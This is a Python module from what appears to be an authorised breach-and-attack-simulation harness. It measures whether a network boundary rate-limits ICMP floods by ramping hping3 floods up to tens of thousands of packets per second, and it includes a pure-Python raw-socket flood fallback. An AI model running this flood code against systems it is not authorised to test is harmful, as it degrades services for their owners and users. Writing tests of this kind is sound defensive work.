"""ICMP Flood (DoS) — tests ICMP rate-limit / flood protection at the boundary.

The old model asked "did I DoS the target into packet loss?" — which needs a
volume a single host can't push over the internet, so it dead-ended at
"0% loss → inconclusive". Wrong question for a *boundary* control.

The right question an SD-WAN/segmentation control answers is "does the boundary
rate-limit or drop a high-rate ICMP flood?" — and THAT is measurable from one
host as a **differential**:

  1. baseline  — normal-rate ICMP (`ping -i 0.2`): does ordinary ICMP work at all?
  2. RAMP      — step high-rate ICMP UP through several rates (`hping3 -1`,
                 HARNESS_ICMP_RAMP pps x near-MTU payload) and find the KNEE: the
                 lowest rate where delivery drops / RTT inflates vs baseline.

Verdict:
  * a ramp step is largely dropped / its RTT balloons -> the boundary polices at
    that rate = BLOCKED-RATELIMIT, and the module reports the MEASURED threshold
    (~X pps / ~Y Mbit/s). Vendor anti-DoS thresholds (Sangfor NGAF / Forcepoint
    NGFW) aren't published and are per-config, so we MEASURE rather than guess.
  * every ramp step is delivered -> NO policing up to the most this source could
    push = SUCCESS/finding; the achieved ceiling is reported so a below-threshold
    PASS isn't mistaken for "no policing at any volume" (a single host often can't
    reach the threshold — use fleet.py / a fatter link to push higher).
  * baseline ICMP 100% lost but the host is up on TCP -> ICMP filtered entirely =
    BLOCKED-ICMP-FILTERED; can't confirm the host is up -> INCONCLUSIVE.

This is decisive in BOTH environments: against a lab with no ICMP policing the
flood is delivered (SUCCESS/finding); against an SD-WAN that rate-limits ICMP the
high-rate stream is dropped while pings still work (BLOCKED). hping3 is the
primary engine (raw-socket line rate + a clean delivery-ratio in its stats); a
pure-Python fallback keeps the module runnable without it (best-effort — it can
confirm the flood had an effect but not fully characterise rate-limiting).

needs_root (raw sockets / CAP_NET_RAW). Run only inside an authorised window.
"""
import errno
import os
import re
import shutil
import socket
import struct
import subprocess
import threading
import time

BASELINE_COUNT = 15        # normal-rate ICMP sample
BASELINE_INTERVAL = "0.2"  # seconds between baseline pings (5 pps)


def _int_env(name, default, lo=1):
    try:
        return max(lo, int(os.environ.get(name) or default))
    except (TypeError, ValueError):
        return default


def _list_env(name, default):
    """Parse a comma-separated int list from env, else the default list."""
    v = os.environ.get(name)
    if not v:
        return list(default)
    try:
        return [int(x) for x in v.replace(" ", "").split(",") if x] or list(default)
    except ValueError:
        return list(default)


# High-rate flood params — ALL overridable so the operator / SD-WAN team can CRANK
# the aggression until the anti-DoS either DROPS the flood (BLOCKED = it prevents at
# that rate) or confirms it never drops (a finding: it only ALERTS). Defaults are
# ~20k pps x 1400B for 15s (host pushes ~168 Mbit/s) = a BANDWIDTH flood by default,
# since a bits/sec-based anti-DoS (like this lab's SD-WAN, ~84 Mbit/s ICMP ceiling)
# only ALERTS on a small-packet pps flood but DROPS a fat-packet one. This default was
# measured to cross the drop threshold (~51%% loss). Set HARNESS_ICMP_SIZE=0 for a pure pps test.
FLOOD_PPS = _int_env("HARNESS_ICMP_PPS", 20000)                        # target packets/sec
FLOOD_SECONDS = _int_env("HARNESS_ICMP_SECONDS", 15)                   # wall-clock cap (s)
FLOOD_COUNT = _int_env("HARNESS_ICMP_COUNT", FLOOD_PPS * FLOOD_SECONDS)  # total packets
FLOOD_SIZE = _int_env("HARNESS_ICMP_SIZE", 1400, lo=0)                 # ICMP payload bytes. Default 1400 (near-MTU) = a BANDWIDTH flood: this lab's SD-WAN (and many anti-DoS engines) threshold on BITS/sec, not pps, so a header-only flood only ALERTS while a fat-packet one gets DROPPED. Set 0 for a pure packet-rate test.
FLOOD_INTERVAL_US = max(1, 1_000_000 // FLOOD_PPS)                     # hping3 -i uX derived from pps
LOW_LOSS = 20              # <= this %: that rate is "getting through"
RATE_LIMIT_DELTA = 30      # flood loss this many points ABOVE baseline => policed
# RTT shaping is a SECONDARY signal and noisy: on a fast/local link, flooding a
# target bumps its avg RTT from queueing on ITS OWN NIC/CPU — not the boundary.
# A sub-ms baseline makes that look like a huge multiple, so require BOTH a large
# multiple AND a meaningful absolute latency floor before calling it shaping.
RTT_INFLATION = 6.0        # flood avg RTT >= Nx baseline, AND ...
RTT_ABS_FLOOR = 150.0      # ... flood avg RTT >= this many ms absolute => shaping

# Rate RAMP (pps). Instead of one arbitrary flood that either trips the appliance
# or doesn't, the module steps UP through these rates and finds the KNEE — the
# lowest rate where delivery drops / RTT inflates = the MEASURED anti-DoS policing
# threshold. Sangfor NGAF / Forcepoint NGFW anti-DoS thresholds are NOT published
# and are per-config (across vendors they span ~10–1000s pps, or are bits/sec-based
# — hence the near-MTU FLOOD_SIZE so a bandwidth policer is exercised too), so we
# MEASURE the knee rather than guess a number. Each step also reports achieved
# Mbit/s. Override the whole ramp with HARNESS_ICMP_RAMP="200,1000,5000,...".
RAMP_PPS = _list_env("HARNESS_ICMP_RAMP", [200, 1000, 5000, 20000, 60000])
STEP_SECONDS = _int_env("HARNESS_ICMP_STEP_SECONDS", 4)   # seconds per ramp step

META = {
    "id": "icmp_flood",
    "name": "ICMP Flood (DoS)",
    "category": "Network Exploitation",
    # Near the end (order 99), just BEFORE ssh_brute (order 100). Both DoS/brute
    # floods run at the very end so the anti-DoS rate-limit / blacklist they trip
    # can't contaminate other modules; ssh_brute is DEAD last because its brute
    # blacklist outlives icmp's DoS lockout (which clears inside the wait window,
    # so icmp running just before ssh_brute doesn't strand it).
    "order": 99,
    "test_type": "dos",
    "control": "ICMP rate-limit / flood (DoS) protection",
    "fix": "SD-WAN",
    "mitre": ['T1498.001'],
    "cwe": ['CWE-400'],
    "tactic": 'Impact',
    # hping3 is PREFERRED but not hard-required: without it the Python fallback
    # runs, so it isn't in requires (which would PREREQ-MISSING the whole module).
    # ping is the one true dependency (the baseline leg).
    "requires": ["ping"],
    "needs_root": True,   # a real ICMP flood needs raw sockets (root / CAP_NET_RAW)
    "serial": True,       # DoS: must run alone (don't overlap other tests)
    "run_last": True,     # a flood can trip anti-DoS rate-limiting/blacklist of the
                          # source — run after everything else so it can't contaminate
                          # other modules' verdicts
    "os_supported": ["Linux"],   # uses `ping -c/-i` + hping3/raw ICMP (Linux-only)
    "ports": [("icmp", None)],   # ICMP, not a TCP/UDP port
    # SUCCESS = the high-rate flood was delivered (boundary didn't rate-limit it).
    # Anchored (^) so it can't match incidental words elsewhere in tool output.
    "success_regex": r"^PASS",
    # BLOCKED = the boundary policed the flood (differential rate-limit / RTT
    # shaping), or an outright network-layer block. A privilege/tooling failure
    # (FLOOD-PRIV-ERROR) must NOT match here — the flood never ran, so it is not
    # evidence the control worked; it falls to NO-RESULT instead.
    "blocked_regex": r"^BLOCKED-|No route to host|Network is unreachable|host unreachable",
}

# markers that mean the flood never actually sent (privilege/tooling failure) —
# NOT evidence the control worked.
_PRIV_ERR_MARKERS = ("operation not permitted", "raw socket", "permission denied",
                     "a password is required", "a terminal is required", "sudo:")


def _parse_loss(text):
    """Percent packet loss from a ping/hping3 statistics block, or None."""
    m = re.search(r"(\d+(?:\.\d+)?)% packet loss", text or "")
    return float(m.group(1)) if m else None


def _parse_rtt_avg(text):
    """Average RTT (ms) from a ping ('rtt .. = a/b/c/d') or hping3
    ('round-trip .. = a/b/c') statistics line, or None."""
    m = re.search(r"(?:rtt|round-trip)[^=]*=\s*[\d.]+/([\d.]+)/", text or "")
    return float(m.group(1)) if m else None


def _parse_sent(text):
    """Packets actually transmitted, from a ping/hping3 'N packets transmitted' line."""
    m = re.search(r"(\d+)\s+packets transmitted", text or "")
    return int(m.group(1)) if m else None


def _rate_report(sent, seconds, size, target_pps):
    """(rate_str, source_limited) describing the load ACTUALLY pushed. A single host
    over the internet usually can't reach the configured pps (NIC/CPU/link cap), so a
    PASS must report the REAL achieved rate — otherwise 'delivered @ ~20000 pps'
    overstates it and a below-threshold PASS reads as 'no policing' when the control
    simply was never reached. source_limited flags that the achieved rate fell well
    short of the target (the bottleneck is here, not the boundary)."""
    if not sent or not seconds or seconds <= 0:
        return ("~%s pps (configured target)" % f"{target_pps:,}", False)
    pps = sent / seconds
    mbps = sent * ((size or 0) + 28) * 8 / seconds / 1e6   # +28 = IPv4(20)+ICMP(8) headers
    return ("~%s pps / ~%d Mbit/s ACHIEVED over %ds (configured target ~%s pps)"
            % (f"{pps:,.0f}", mbps, seconds, f"{target_pps:,}"), pps < 0.5 * target_pps)


def _fmt(x, nd=0):
    """Format a number for the ramp table, or '?' for None."""
    return "?" if x is None else f"{x:,.{nd}f}"


def _is_knee(loss, rtt, base_loss, base_rtt):
    """True if a ramp step shows the boundary POLICING the flood: loss jumped
    >= RATE_LIMIT_DELTA points over baseline, OR RTT inflated >= RTT_INFLATION x
    baseline AND >= RTT_ABS_FLOOR ms (the floor keeps LAN queueing from faking it)."""
    loss_jump = (loss is not None and base_loss is not None
                 and (loss - base_loss) >= RATE_LIMIT_DELTA)
    rtt_jump = (base_rtt and rtt and base_rtt > 0
                and rtt / base_rtt >= RTT_INFLATION and rtt >= RTT_ABS_FLOOR)
    return bool(loss_jump or rtt_jump)


# TCP ports probed to decide "is the host actually UP?" when ICMP is 100% lost,
# ordered by how commonly they answer on a Windows DC / Linux server / appliance.
_LIVENESS_PORTS = (445, 80, 443, 22, 389, 3389, 8080, 139, 135, 21, 23, 53, 1135, 4445)


def _host_up_via_tcp(target, ctx=None, timeout=1.0, budget=6.0):
    """Is the host's TCP stack reachable? Returns (up, how). ANY probed port that
    is open OR explicitly refuses with a RST proves the host is UP and reachable;
    only an all-timeouts result (silent drop) leaves it unconfirmed. Used when
    ICMP is 100% lost: a confirmed-up host with 0 ICMP = ICMP filtered (a real
    BLOCK), whereas an unconfirmable host is genuinely indeterminate. Honours
    ctx egress bind; bounded by `budget` so it can never hang the run. The verdict
    it feeds comes purely from what the probes observed — no posture/policy
    reliance (ORG2026-70)."""
    deadline = time.time() + budget
    for port in _LIVENESS_PORTS:
        if time.time() > deadline:
            break
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            if ctx is not None:
                try:
                    ctx.bind_source(sk)
                except Exception:
                    pass
            sk.settimeout(timeout)
            rc = sk.connect_ex((target, port))
        except OSError:
            continue
        finally:
            try:
                sk.close()
            except OSError:
                pass
        if rc == 0:
            return True, f"tcp/{port} (open)"
        if rc == errno.ECONNREFUSED:
            return True, f"tcp/{port} (RST — stack reachable)"
    return False, None


# --------------------------------------------------------------------------
# Pure-Python ICMP flood fallback (used only when hping3 is absent)
# --------------------------------------------------------------------------
def _checksum(data):
    if len(data) % 2:
        data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data) // 2), data))
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def _echo_packet(seq):
    pid = os.getpid() & 0xFFFF
    payload = b"mygovnet-bas-icmp"
    header = struct.pack("!BBHHH", 8, 0, 0, pid, seq & 0xFFFF)  # type 8 = echo
    chk = _checksum(header + payload)
    header = struct.pack("!BBHHH", 8, 0, chk, pid, seq & 0xFFFF)
    return header + payload


def _open_icmp_socket():
    """(sock, mode) — try unprivileged SOCK_DGRAM ICMP first (works where
    net.ipv4.ping_group_range allows it), then a raw socket (needs root)."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_ICMP)
        return s, "dgram(unprivileged)"
    except (PermissionError, OSError):
        pass
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)  # may raise
    return s, "raw(root)"


def _py_icmp_flood(target, seconds, result):
    """Flood ICMP echo to target for `seconds`; records sent count / error in
    the `result` dict. Runs in a background thread."""
    try:
        sock, mode = _open_icmp_socket()
    except (PermissionError, OSError) as e:
        result["error"] = f"{e.__class__.__name__}: {e}"
        return
    result["mode"] = mode
    sock.setblocking(False)
    deadline = time.time() + seconds
    seq = sent = 0
    try:
        dest = (target, 0)
        while time.time() < deadline:
            try:
                sock.sendto(_echo_packet(seq), dest)
                sent += 1
                seq += 1
            except BlockingIOError:
                continue
            except OSError as e:
                result["error"] = f"{e.__class__.__name__}: {e}"
                break
    finally:
        sock.close()
    result["sent"] = sent


def _baseline(target):
    """Normal-rate ICMP reference: (loss%, avg_rtt_ms, raw_text)."""
    try:
        p = subprocess.run(
            ["ping", "-c", str(BASELINE_COUNT), "-i", BASELINE_INTERVAL, target],
            capture_output=True, text=True, timeout=BASELINE_COUNT * 1 + 15,
            stdin=subprocess.DEVNULL)
        return _parse_loss(p.stdout), _parse_rtt_avg(p.stdout), p.stdout
    except Exception as e:
        return None, None, f"[baseline ping error] {e}"


def _hping_flood_at(target, pps, size, seconds):
    """One RAMP STEP: counted hping3 ICMP at ~`pps` for `seconds`. Counted (-c) +
    fast (-i uX) so hping3 prints a real delivery-ratio block (unlike --flood,
    which discards replies). Returns (loss%, avg_rtt_ms, sent, raw_text)."""
    import core
    interval_us = max(1, 1_000_000 // max(1, pps))
    count = max(1, pps * seconds)
    prefix = (["timeout", str(seconds)] if shutil.which("timeout") else [])
    cmd = prefix + core.sudo_prefix() + ["hping3", "-1", "-c", str(count), "-i", "u%d" % interval_us]
    if size > 0:
        cmd += ["-d", str(size)]              # payload bytes -> bandwidth flood
    cmd += [target]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True,
                           timeout=seconds + 10, stdin=subprocess.DEVNULL)
        out = (p.stdout or "") + (p.stderr or "")
    except subprocess.TimeoutExpired as e:
        out = (((e.output or "") if isinstance(e.output, str) else "")) + "\n[step hit wall-clock cap]"
    return _parse_loss(out), _parse_rtt_avg(out), _parse_sent(out), out


def run(target, ctx):
    out = [f"# ICMP flood vs {target} — boundary anti-DoS test: RAMP the rate to find the "
           f"policing knee (baseline {BASELINE_COUNT}-ping; ramp {RAMP_PPS} pps"
           + (f" x {FLOOD_SIZE}B" if FLOOD_SIZE else "") + f" x {STEP_SECONDS}s/step)"]

    # ---- leg 1: normal-rate baseline (does ordinary ICMP work at all?) --------
    base_loss, base_rtt, base_txt = _baseline(target)
    out.append("## baseline (normal-rate ICMP)")
    out.append(base_txt.strip())
    out.append(f"baseline: loss={base_loss}%  avg_rtt={base_rtt}ms")
    base_ok = base_loss is not None and base_loss <= LOW_LOSS

    # Baseline (near-)100% lost => no rate differential to measure. Decide via TCP
    # liveness: host up on TCP + ICMP gone = ICMP filtered (BLOCKED); can't confirm
    # up = INCONCLUSIVE (down / source quarantined). Verdict from the test only.
    if not base_ok:
        up, how = _host_up_via_tcp(target, ctx) if base_loss is not None else (False, None)
        if up:
            out.append(
                f"BLOCKED-ICMP-FILTERED: normal-rate ICMP lost {base_loss}% but the host is "
                f"confirmed UP via {how} — ICMP is dropped/filtered end-to-end while TCP passes, "
                "so the boundary/host BLOCKS ICMP (control held). A real block, not an "
                "unreachable host.")
        else:
            out.append(
                f"[INCONCLUSIVE] even normal-rate ICMP lost {base_loss}% and TCP liveness couldn't "
                "confirm the host is up (no port answered) — can't separate a down/unreachable "
                "host (or a source just quarantined) from ICMP filtered entirely. Review raw log.")
        return "\n".join(out)

    # ---- leg 2: RAMP the rate and find the KNEE (measured policing threshold) --
    if shutil.which("hping3"):
        out.append(f"## ramp (hping3): step the ICMP rate up — the knee = first rate the boundary "
                   f"polices (baseline loss {_fmt(base_loss, 1)}%, rtt {_fmt(base_rtt, 1)}ms)")
        knee = None
        max_pps = max_mbps = 0.0
        for pps in RAMP_PPS:
            loss, rtt, snt, raw = _hping_flood_at(target, pps, FLOOD_SIZE, STEP_SECONDS)
            # privilege/tooling failure => the flood never ran (NOT a control result)
            if loss is None and any(mk in raw.lower() for mk in _PRIV_ERR_MARKERS):
                out.append(
                    "FLOOD-PRIV-ERROR: hping3 could not run with the privileges it needs — the "
                    "flood never ran. NOT evidence the control works. Fix ONE of: (a) sudo setcap "
                    "cap_net_raw,cap_net_admin+eip $(which hping3); (b) a NOPASSWD sudoers rule for "
                    "hping3; or (c) run as root.")
                return "\n".join(out)
            apps = (snt / STEP_SECONDS) if snt else None
            ambps = (snt * ((FLOOD_SIZE or 0) + 28) * 8 / STEP_SECONDS / 1e6) if snt else None
            max_pps = max(max_pps, apps or 0.0)
            max_mbps = max(max_mbps, ambps or 0.0)
            out.append("  step target ~%s pps -> achieved ~%s pps / ~%s Mbit/s . loss=%s%% rtt=%sms"
                       % (f"{pps:,}", _fmt(apps), _fmt(ambps), _fmt(loss, 1), _fmt(rtt, 1)))
            if _is_knee(loss, rtt, base_loss, base_rtt):
                knee = {"pps": apps, "mbps": ambps, "target": pps, "loss": loss, "rtt": rtt}
                break

        if knee:
            out.append(
                "BLOCKED-RATELIMIT: ICMP policing kicked in at ~%s pps / ~%s Mbit/s (target %s pps) "
                "— loss %s%% vs %s%% baseline, rtt %sms vs %sms. This is the MEASURED anti-DoS "
                "threshold (Sangfor/Forcepoint defaults aren't published — the ramp measured it); "
                "the control holds at/above this rate."
                % (_fmt(knee["pps"]), _fmt(knee["mbps"]), f"{knee['target']:,}", _fmt(knee["loss"], 1),
                   _fmt(base_loss, 1), _fmt(knee["rtt"], 1), _fmt(base_rtt, 1)))
        else:
            out.append(
                "PASS: NO ICMP policing observed across the ramp — the flood was delivered up to the "
                "most this source could push (~%s pps / ~%s Mbit/s) at <=%d%% loss. The anti-DoS "
                "threshold, if any, is ABOVE that, and a single host usually can't reach a carrier/"
                "SD-WAN ceiling: raise HARNESS_ICMP_SIZE (bigger packets for a bits/sec policer), "
                "extend HARNESS_ICMP_RAMP higher, use a fatter/closer link, or drive MULTIPLE "
                "sources (fleet.py) to push past the threshold." % (_fmt(max_pps), _fmt(max_mbps), LOW_LOSS))
        return "\n".join(out)

    # ---- leg 2 (fallback): no hping3 -> single Python flood, best-effort -------
    out.append("## high-rate flood (engine: python ICMP fallback — hping3 not installed; no rate "
               "ramp, best-effort)")
    py_result = {}
    th = threading.Thread(target=_py_icmp_flood, args=(target, FLOOD_SECONDS, py_result), daemon=True)
    th.start()
    try:
        dp = subprocess.run(["ping", "-c", str(BASELINE_COUNT), target], capture_output=True,
                            text=True, timeout=BASELINE_COUNT + 15, stdin=subprocess.DEVNULL)
        flood_loss = _parse_loss(dp.stdout)
        out.append(dp.stdout.strip())
    finally:
        th.join(FLOOD_SECONDS + 5)
    if py_result.get("error"):
        out.append(f"python flood error: {py_result['error']}")
        out.append(
            "FLOOD-PRIV-ERROR: the Python ICMP fallback could not send — unprivileged ICMP is "
            "disabled and we're not root. Fix ONE of: (a) install hping3 (sudo apt install hping3); "
            "(b) run as root; or (c) sudo sysctl -w net.ipv4.ping_group_range='0 2147483647'.")
        return "\n".join(out)
    sent = py_result.get("sent")
    rate_str, source_limited = _rate_report(sent, FLOOD_SECONDS, FLOOD_SIZE, FLOOD_PPS)
    out.append(f"python flood: sent {sent} ICMP echoes via {py_result.get('mode', '?')}; "
               f"during-flood loss={flood_loss}%")
    if flood_loss is None:
        out.append("[INCONCLUSIVE] could not parse the flood's delivery ratio — review raw log.")
    elif base_loss is not None and (flood_loss - base_loss) >= RATE_LIMIT_DELTA:
        out.append(f"BLOCKED-RATELIMIT: flood lost {flood_loss:.1f}% vs {base_loss:.1f}% baseline — "
                   "the boundary policed the high-rate ICMP (control held).")
    elif flood_loss <= LOW_LOSS:
        msg = (f"PASS: the python ICMP flood was delivered ({flood_loss:.1f}% loss, {rate_str}) — "
               "not policed at this volume.")
        if source_limited:
            msg += (" [under-powered] achieved rate is well below target — install hping3 for the "
                    "rate ramp, or drive multiple sources (fleet.py) to reach the threshold.")
        out.append(msg)
    else:
        out.append(f"[INCONCLUSIVE] flood {flood_loss:.1f}% loss vs {base_loss}% baseline — ambiguous; "
                   "install hping3 for a proper rate ramp. Review raw log.")
    return "\n".join(out)
